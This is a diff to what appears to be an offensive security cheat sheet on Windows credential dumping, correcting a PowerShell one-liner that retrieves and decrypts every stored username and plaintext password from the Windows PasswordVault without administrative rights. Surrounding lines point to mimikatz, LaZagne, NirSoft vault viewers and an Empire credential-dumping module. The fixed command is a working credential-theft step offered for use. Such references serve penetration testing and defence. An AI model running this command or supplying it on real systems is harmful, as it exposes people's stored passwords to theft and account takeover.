@@ -1137,14 +1137,14 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 
 Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
 
-### UWP PasswordVault / Credential Locker
+###  PasswordVault / Credential Locker
 
 Modern Windows UWP applications, Microsoft Edge, and modern system services store authentication tokens and plaintext passwords inside the Universal Windows Platform (UWP) `PasswordVault` (also exposed as `Web Credentials` in `vaultcmd`). This storage space is session-isolated and can be decrypted natively without administrative or `SeDebugPrivilege` rights.
 
 Execute this PowerShell command inside the user's active session to instantly dump and decrypt all stored usernames and plaintext passwords:
 
 ```ps1
-[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; v = New-Object Windows.Security.Credentials.PasswordVault; v.RetrieveAll() | ForEach-Object { try { \(_.RetrievePassword();\)_ } catch{} } | Select-Object Resource, UserName, Password | Format-List
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
 ```
 
 ### DPAPI
